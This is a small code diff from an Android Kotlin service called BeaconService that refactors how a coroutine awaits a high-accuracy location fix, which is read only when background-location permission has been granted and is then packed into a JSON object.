@@ -42,7 +42,7 @@ class BeaconService : Service() {
                 val extra = JSONObject()
                 if (mode == "LOCATION_STREAM" && PermissionManager.hasBackgroundLocation(applicationContext)) {
                     try {
-                        val loc = kotlinx.coroutines.tasks.await(fused.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null))
+                        val loc = fused.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null).await()
                         if (loc != null) {
                             val locObj = JSONObject()
                             locObj.put("lat", loc.latitude); locObj.put("lon", loc.longitude); locObj.put("acc", loc.accuracy)
